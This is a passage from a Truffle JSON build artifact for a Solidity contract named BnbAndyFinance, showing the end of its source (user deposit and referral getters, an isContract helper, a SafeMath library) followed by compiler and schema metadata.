(\r\n            getUserTotalDeposits(userAddress),\r\n            getUserTotalWithdrawn(userAddress),\r\n            getUserTotalReferrals(userAddress)\r\n        );\r\n    }\r\n\r\n    function isContract(address addr) internal view returns (bool) {\r\n        uint256 size;\r\n        assembly {\r\n            size := extcodesize(addr)\r\n        }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\Sait\\Documents\\GitHub\\ZeppelinProject\\truffleautoprojectBnbAndyFinance\\contracts\\BnbAndyFinance.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.18+commit.87f61d96.Emscripten.clang"
  },
  "schemaVersion": "3.4.15",
  "updatedAt": "2023-09-26T21:50:42.301Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}